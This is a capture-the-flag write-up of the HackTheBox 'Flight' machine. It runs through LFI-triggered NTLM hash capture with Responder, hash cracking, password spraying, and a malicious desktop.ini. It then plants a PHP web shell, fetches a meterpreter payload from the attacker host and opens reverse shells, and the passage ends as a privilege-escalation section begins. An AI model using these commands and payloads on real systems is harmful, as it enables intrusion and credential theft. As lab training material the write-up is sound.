@@ -1,0 +1,939 @@
+<title>HackTheBox - Flight (Hard)</title>
+<header>
+	<div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/HackTheBox/Hard/Flight/icon.png"/>
+      <p class="mainTitle">HackTheBox - Flight (Hard)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+	<h1 id="table-of-contents">Table of contents</h1>
+	<nav id="tableOfContents" class="tableOfContents">
+	</nav>
+  <h1 id="reconnaissance">Reconnaissance</h1>
+  <h2 id="nmap-scan">Nmap scan</h2>
+  <div class="codeBlock"># Nmap 7.93 scan initiated Thu Jul 20 22:29:47 2023 as: nmap -A -p- -T5 -oN nmapResults.txt 10.129.137.102
+Nmap scan report for 10.129.137.102
+Host is up (0.027s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-21 03:30:47Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -7s
+| smb2-time: 
+|   date: 2023-07-21T03:31:37
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 20 22:32:22 2023 -- 1 IP address (1 host up) scanned in 155.67 seconds</div>
+  <h2 id="web-reconnaissance">Web reconnaissance</h2>
+  <p>Let’s take a look at the website on port <code>80</code> :</p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled.png"/>
+  <p>If we take a look at the bottom of the page, we can find a domain name : </p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 1.png"/>
+  <p>We can add this domain name to our <code>/etc/hosts</code> file :</p>
+  <div class="codeBlock">cyberretta@localhost ~ $ cat /etc/hosts
+127.0.0.1 localhost
+
+10.129.137.102	flight.htb</div>
+  <h2 id="subdomains-virtual-hosts-enumeration">Subdomains/Virtual hosts enumeration</h2>
+  <p>Now that we found a domain name, we can enumerate subdomains using <a href="https://github.com/OJ/gobuster">Gobuster</a> :</p>
+  <div class="codeBlock">cyberretta@localhost ~/Documents/HTB/CTF/Hard/Flight $ gobuster vhost -u http://flight.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://flight.htb/
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:      gobuster/3.5
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+2023/07/20 23:07:19 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: school.flight.htb Status: 200 [Size: 3996]
+Found: csg-fin-0104.csg.flight.htb Status: 404 [Size: 313]
+Found: mvm-ri-i124155.roslin.flight.htb Status: 404 [Size: 318]
+Found: secom.flight.htb Status: 404 [Size: 302]
+Found: www.helen.flight.htb Status: 404 [Size: 306]
+Found: csg-fin-0056.csg.flight.htb Status: 404 [Size: 313]
+Found: aegis.flight.htb Status: 404 [Size: 302]
+Found: ppls-cm.ppls.flight.htb Status: 404 [Size: 309]
+Found: hss-hca-0034.shca.flight.htb Status: 404 [Size: 314]
+Found: mvm-ri-d097075.roslin.flight.htb Status: 404 [Size: 318]
+Progress: 114330 / 114442 (99.90%)
+===============================================================
+2023/07/20 23:13:35 Finished
+===============================================================</div>
+  <p>Subdomains with <code>404</code> response code seems to be false positives, but we found one valid subdomain : <code>school.flight.htb</code>.</p>
+  <h2>School subdomain enumeration</h2>
+  <p>Let’s take a look at this subdomain :</p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 2.png"/>
+  <p>If we click on <code>About Us</code>, we are redirected to <code>http://school.flight.htb/index.php?view=about.html</code> :</p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 3.png"/>
+  <h1 id="initial-access">Initial access</h1>
+  <h2 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h2>
+  <p>
+    Maybe it is vulnerable to LFI (Local File Inclusion) ? If we try to pass the value <code>C:/WINDOWS/System32/drivers/etc/hosts</code> to 
+    the <code>view</code> parameter, we get the following page :
+  </p>
+  <img src="/write-ups/HackTheBox/Hard/Flight/Untitled 4.png"/>
+  <p>
+    So the <code>view</code> parameter is vulnerable to LFI (Local File Inclusion). Since it is a Windows host, we may 
+    be able to retrieve an NTLM hash from the webserver. To do so, we can use the <a href="https://github.com/SpiderLabs/Responder">Responder</a>. 
+    First, let’s start it : 
+  </p>
+  <div class="codeBlock">cyberretta@localhost ~/Documents/HTB/CTF/Hard/Flight/php_filter_chain_generator $ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.93]
+    Responder IPv6             [dead:beef:2::105b]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-8O0OQ5QSQKN]
+    Responder Domain Name      [C3J3.LOCAL]
+    Responder DCE-RPC Port     [48765]
+
+[+] Listening for events...
+
+[!] Error starting SSL server on port 443, check permissions or other servers running.
+[!] Error starting SSL server on port 5986, check permissions or other servers running.
+[!] Error starting TCP server on port 25, check permissions or other servers running.</div>
+  <p>
+    Now that we have our <a href="https://github.com/SpiderLabs/Responder">Responder</a> listening for connections, we can pass the value 
+    <code>//[ATTACKER_IP]/whatever</code> to the <code>view</code> parameter to make the target webserver connect to 
+    our <a href="https://github.com/SpiderLabs/Responder">Responder</a> via SMB :
+  </p>
+  <div class="codeBlock">[SMB] NTLMv2-SSP Client   : 10.129.137.102
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:52bb99075e621d68:C2815209215345BEF834E759345409A5:0101000000000000006BA7C761BBD90182221EA0DE20C8660000000002000800430033004A00330001001E00570049004E002D0038004F0030004F00510035005100530051004B004E0004003400570049004E002D0038004F0030004F00510035005100530051004B004E002E00430033004A0033002E004C004F00430041004C0003001400430033004A0033002E004C004F00430041004C0005001400430033004A0033002E004C004F00430041004C0007000800006BA7C761BBD90106000400020000000800300030000000000000000000000000300000E61C5F17831E22811F2DFE7422D30D9AA92F0B5B66E86C68CA955D9F3996DF850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000</div>
+  <p>We successfully captured an NTLM hash.</p>
+  <h2 id="svc_apache-hash-cracking">svc_apache hash cracking</h2>
+  <p>Let’s try to crack the NTLM hash we retrieved with the <code>rockyou.txt</code> wordlist :</p>
+  <div class="codeBlock">cyberretta@localhost ~/Documents/HTB/CTF/Hard/Flight/php_filter_chain_generator $ cat hash.txt 
+svc_apache::flight:52bb99075e621d68:C2815209215345BEF834E759345409A5:0101000000000000006BA7C761BBD90182221EA0DE20C8660000000002000800430033004A00330001001E00570049004E002D0038004F0030004F00510035005100530051004B004E0004003400570049004E002D0038004F0030004F00510035005100530051004B004E002E00430033004A0033002E004C004F00430041004C0003001400430033004A0033002E004C004F00430041004C0005001400430033004A0033002E004C004F00430041004C0007000800006BA7C761BBD90106000400020000000800300030000000000000000000000000300000E61C5F17831E22811F2DFE7422D30D9AA92F0B5B66E86C68CA955D9F3996DF850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000
+cyberretta@localhost ~/Documents/HTB/CTF/Hard/Flight/php_filter_chain_generator $ hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt -w 3
+hashcat (v6.2.6) starting in autodetect mode
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-haswell-AMD Ryzen 3 3100 4-Core Processor, 1801/3666 MB (512 MB allocatable), 2MCU
+
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
+
+5600 | NetNTLMv2 | Network Protocol
+
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 byteDictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytDictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 1 sec
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+SVC_APACHE::flight:52bb99075e621d68:c2815209215345bef834e759345409a5:0101000000000000006ba7c761bbd90182221ea0de20c8660000000002000800430033004a00330001001e00570049004e002d0038004f0030004f00510035005100530051004b004e0004003400570049004e002d0038004f0030004f00510035005100530051004b004e002e00430033004a0033002e004c004f00430041004c0003001400430033004a0033002e004c004f00430041004c0005001400430033004a0033002e004c004f00430041004c0007000800006ba7c761bbd90106000400020000000800300030000000000000000000000000300000e61c5f17831e22811f2dfe7422d30d9aa92f0b5b66e86c68ca955d9f3996df850a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390033000000000000000000:S@Ss!K@*t13
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: SVC_APACHE::flight:52bb99075e621d68:c2815209215345b...000000
+Time.Started.....: Fri Jul 21 00:14:14 2023 (12 secs)
+Time.Estimated...: Fri Jul 21 00:14:26 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   962.7 kH/s (0.39ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10663424/14344384 (74.34%)
+Rejected.........: 0/10663424 (0.00%)
+Restore.Point....: 10662912/14344384 (74.34%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: S@lman4eva -&gt; S8terboi
+Hardware.Mon.#1..: Util: 84%
+
+Started: Fri Jul 21 00:13:38 2023
+Stopped: Fri Jul 21 00:14:27 2023</div>
+  <p>We successfully cracked the NTLM hash and recovered the password for <code>svc_apache</code> user account.</p>
+  <h2 id="ldap-enumeration">LDAP enumeration</h2>
+  <ul>
+    <li>We cannot use the credentials we found to login via WinRM on port <code>5985</code></li>
+  </ul>
+  <ul>
+    <li>We cannot write on any SMB shares to upload a PHP reverse shell (for now)</li>
+  </ul>
+  <p>LDAP is running on the target, we can dump domain information using <code>ldapdomaindump</code> :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/Hard/Flight/loot/domain_loot]
+└─$ sudo ldapdomaindump ldap://flight.htb -u &#x27;flight.htb\svc_apache&#x27; -p &#x27;S@Ss!K@*t13&#x27; 
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished</div>
+  <p>The <code>domain_users.json</code> file contains domain users. We can create a user account wordlist from this file :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/Hard/Flight/loot/domain_loot]
+└─$ cat domain_users.json | grep -e &#x27;&quot;dn&quot;:&#x27; | cut -d &quot;,&quot; -f 1 | cut -d &quot;=&quot; -f 2 &gt; users.txt
+                                                                                                                             
+┌──(kali㉿kali)-[~/…/Hard/Flight/loot/domain_loot]
+└─$ cat users.txt                                                                          
+O.Possum
+svc_apache
+V.Stevens
+D.Truff
+I.Francis
+W.Walker
+C.Bum
+M.Gold
+L.Kein
+G.Lors
+R.Cold
+S.Moon
+krbtgt
+Guest
+Administrator</div>
+  <h2 id="smb-password-spraying-attack">SMB password spraying attack</h2>
+  <p>Now, we can perform a password spraying attack on SMB using those usernames and the password we cracked earlier :</p>
+  <div class="codeBlock">msf6 &gt; search smb_login
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login
+
+msf6 &gt; use 0
+smsf6 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS flight.htb
+RHOSTS =&gt; flight.htb
+msf6 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE users.txt
+USER_FILE =&gt; users.txt
+msf6 auxiliary(scanner/smb/smb_login) &gt; set PASSWORD S@Ss!K@*t13
+PASSWORD =&gt; S@Ss!K@*t13
+msf6 auxiliary(scanner/smb/smb_login) &gt; set VERBOSE false
+VERBOSE =&gt; false
+msf6 auxiliary(scanner/smb/smb_login) &gt; run
+
+[+] 10.129.137.102:445    - 10.129.137.102:445 - Success: &#x27;.\svc_apache:S@Ss!K@*t13&#x27;
+[+] 10.129.137.102:445    - 10.129.137.102:445 - Success: &#x27;.\S.Moon:S@Ss!K@*t13&#x27;
+[*] flight.htb:445        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</div>
+  <p>We found a user with the same password.</p>
+  <h2 id="smb-enumeration-s-moon">SMB enumeration (S.Moon)</h2>
+  <p>Now, let’s take a look again at the SMB service with the new credentials we found :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Flight]
+└─$ smbmap -H flight.htb -u &#x27;S.Moon&#x27; -p &#x27;S@Ss!K@*t13&#x27;
+[+] IP: flight.htb:445  Name: unknown                                           
+ Disk                                    Permissions     Comment
+ ----                                    -----------     -------
+ ADMIN$                                  NO ACCESS       Remote Admin
+ C$                                      NO ACCESS       Default share
+ IPC$                                    READ ONLY       Remote IPC
+ NETLOGON                                READ ONLY       Logon server share 
+ Shared                                  READ, WRITE
+ SYSVOL                                  READ ONLY       Logon server share 
+ Users                                   READ ONLY
+ Web                                     READ ONLY</div>
+  <p>
+    We have write access to the <code>Shared</code> SMB share. But we cannot write PHP files on it. The only file extension that 
+    seems to be authorized is <code>.ini</code>. If this share is accessed by other users on the target system, we may be able to 
+    capture their NTLM hash by uploading a malicious <code>desktop.ini</code> file.
+  </p>
+  <p>
+    The <code>desktop.ini</code> file is used to store information about the arrangement of a Windows folder. For example, it can contain 
+    the path to the folder image. If we set the value of this setting to our IP address, when someone will load the icon of this share, it will 
+    send a request to our attacking host and we will be able to retrieve an NTLM hash.
+  </p>
+  <h2 id="capturing-c-bum-ntlm-hash">Capturing C.Bum NTLM hash</h2>
+  <p>Let’s start a <a href="https://github.com/SpiderLabs/Responder">Responder</a> first :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tun0
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.93]
+    Responder IPv6             [dead:beef:2::105b]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-UGXT5WQC19Y]
+    Responder Domain Name      [JSYP.LOCAL]
+    Responder DCE-RPC Port     [46391]
+
+[+] Listening for events...</div>
+  <p>Now, we can create the malicious <code>desktop.ini</code> file :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Flight/exploits]
+└─$ cat desktop.ini 
+[.ShellClassInfo]
+IconResource=\\10.10.14.93\whatever</div>
+  <p>Then, we can upload it to the <code>Shared</code> SMB share :</p>
+  <div class="codeBlock">smb: \&gt; put desktop.ini 
+putting file desktop.ini as \desktop.ini (0.6 kb/s) (average 0.6 kb/s)
+smb: \&gt; ls
+  .                                   D        0  Fri Jul 21 04:50:44 2023
+  ..                                  D        0  Fri Jul 21 04:50:44 2023
+  desktop.ini                         A       54  Fri Jul 21 04:50:44 2023
+
+                5056511 blocks of size 4096. 1187791 blocks available</div>
+  <p>Finally, we have to wait for someone to trigger the <code>desktop.ini</code> file :</p>
+  <div class="codeBlock">[+] Listening for events...                                                                                                   
+
+[SMB] NTLMv2-SSP Client   : 10.129.137.102
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum                                                                                  
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:5fdfc0c69f498fa7:86D24826E548C360FE36F585DF271421:01010000000000008093229953BBD901E62A7F6D436A113B00000000020008004A0053005900500001001E00570049004E002D005500470058005400350057005100430031003900590004003400570049004E002D00550047005800540035005700510043003100390059002E004A005300590050002E004C004F00430041004C00030014004A005300590050002E004C004F00430041004C00050014004A005300590050002E004C004F00430041004C00070008008093229953BBD90106000400020000000800300030000000000000000000000000300000E61C5F17831E22811F2DFE7422D30D9AA92F0B5B66E86C68CA955D9F3996DF850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000</div>
+  <p>We successfully captured the NTLM hash for the <code>C.Bum</code> user account.</p>
+  <h2 id="c-bum-ntlm-hash-cracking">C.Bum NTLM hash cracking</h2>
+  <p>Let’s try to crack it now :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/Hard/Flight/loot/hashes]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+Tikkycoll_431012284 (c.bum)     
+1g 0:00:00:04 DONE (2023-07-20 21:55) 0.2040g/s 2150Kp/s 2150Kc/s 2150KC/s TinyMutt69..Tiffani29
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.</div>
+  <h2 id="smb-enumeration-c-bum">SMB enumeration (C.Bum)</h2>
+  <p>Now that we have new credentials, we can see if we have write access to other SMB shares :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/Hard/Flight/loot/hashes]
+└─$ smbmap -H flight.htb -u &#x27;C.Bum&#x27; -p &#x27;Tikkycoll_431012284&#x27;
+[+] IP: flight.htb:445  Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Shared                                                  READ, WRITE
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+        Web                                                     READ, WRITE</div>
+  <p>We can now write to the <code>Web</code> SMB share.</p>
+  <h2 id="getting-a-shell">Getting a shell</h2>
+  <p>Let’s upload a PHP web shell on it and gain access to the system :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Flight/exploits]
+└─$ cat ws.php 
+&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;
+                                                                                                                              
+┌──(kali㉿kali)-[~/…/CTF/Hard/Flight/exploits]
+└─$ smbclient //flight.htb/Web -U C.Bum 
+Password for [WORKGROUP\C.Bum]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd flight.htb\
+smb: \flight.htb\&gt; put ws.php 
+putting file ws.php as \flight.htb\ws.php (0.4 kb/s) (average 0.4 kb/s)</div>
+  <p>Then, we can start a listener :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Flight]
+└─$ nc -lnvp 4242
+listening on [any] 4242 ...</div>
+  <p>Finally, let’s navigate to <code>http://flight.htb/ws.php?cmd=[REVERSE_SHELL_PAYLOAD]</code> in order to get a reverse shell :</p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/HTB/CTF/Hard/Flight]
+└─$ nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.93] from (UNKNOWN) [10.129.137.102] 49983
+
+PS C:\xampp\htdocs\flight.htb&gt; whoami
+flight\svc_apache</div>
+  <p>We have now a foothold on the system as <code>svc_apache</code>.</p>
+  <h1 id="post-exploitation">Post-exploitation</h1>
+  <h2 id="getting-a-better-shell">Getting a better shell</h2>
+  <p>
+    Before continuing, we can try to get a better shell. To facilitate the post exploitation phase, I will generate a meterpreter 
+    payload and start a python web server :
+  </p>
+  <div class="codeBlock">┌──(kali㉿kali)-[~/…/CTF/Hard/Flight/exploits]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
+                                                                                                                              
+┌──(kali㉿kali)-[~/…/CTF/Hard/Flight/exploits]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</div>
+  <p>Then, I can start a listener using the <a href="https://www.metasploit.com/">Metasploit Framework</a> :</p>
+  <div class="codeBlock">msf6 &gt; use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(multi/handler) &gt; set LPORT 4444
+LPORT =&gt; 4444
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.93:4444</div>
+  <p>Next, I can download the executable and execute it on the target :</p>
+  <div class="codeBlock">PS C:\Windows\Temp&gt; wget http://10.10.14.93/meterpreter.exe -O meterpreter.exe
+PS C:\Windows\Temp&gt; .\meterpreter.exe</div>
+  <p>Finally, I should receive a connection on my listener :</p>
+  <div class="codeBlock">[*] Started reverse TCP handler on 10.10.14.93:4444 
+[*] Sending stage (200774 bytes) to 10.129.137.102
+[*] Meterpreter session 1 opened (10.10.14.93:4444 -&gt; 10.129.137.102:50000) at 2023-07-20 22:15:42 -0400
+
+meterpreter &gt; getuid
+Server username: flight\svc_apache</div>
+  <p>Now, I have a meterpreter reverse shell.</p>
+  <h2 id="privilege-escalation-c-bum">Privilege escalation (C.Bum)</h2>
+  <p>
+    We already have credentials for this user, but we still need to gain a shell as him. To do so, we can use the 
+    <a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> tool to open a reverse shell on port <code>5555</code> on our attacking host :
+  </p>
+  <div class="codeBlock">.\RunasCs.exe C.Bum Tikkycoll_431012284 cmd.exe -r 10.10.14.93:5555</div>
+  <p>
+    We can now generate a new malicious file called <code>meterpreter2.exe</code> in order to gain a better shell as <code>C.Bum</code>. 
+    The method is still the same :
+  </p>
+  <ul>
+    <li>Generating the payload with <code>msfvenom</code></li>
+  </ul>
+  <ul>
+    <li>Starting a python web server</li>
+  </ul>
+  <ul>
+    <li>Downloading the <code>meterpreter2.exe</code> file to the target</li>
+  </ul>
+  <ul>
+    <li>Starting a listener using <code>msfconsole</code></li>
+  </ul>
+  <ul>
+    <li>Run the malicious file</li>
+  </ul>
+  <div class="codeBlock">msf6 exploit(multi/handler) &gt; 
+[*] Sending stage (200774 bytes) to 10.129.137.102
+[*] Meterpreter session 4 opened (10.10.14.93:4445 -&gt; 10.129.137.102:56452) at 2023-07-20 23:46:47 -0400
+
+msf6 exploit(multi/handler) &gt; sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  2         meterpreter x64/windows  flight\svc_apache @ G0  10.10.14.93:4444 -&gt; 10.129.137.102:50048 (10.129.137.102)
+  4         meterpreter x64/windows  flight\C.Bum @ G0       10.10.14.93:4445 -&gt; 10.129.137.102:56452 (10.129.137.102)</div>
+  <p>Now, we have a meterpreter shell as <code>C.Bum</code>.</p>
+  <h2 id="privilege-escalation-iis-apppool">Privilege escalation (IIS APPPOOL\DefaultAppPool)</h2>
+  <p>If we take a look at the listening ports, we can see that port <code>8000</code> is listening locally :</p>
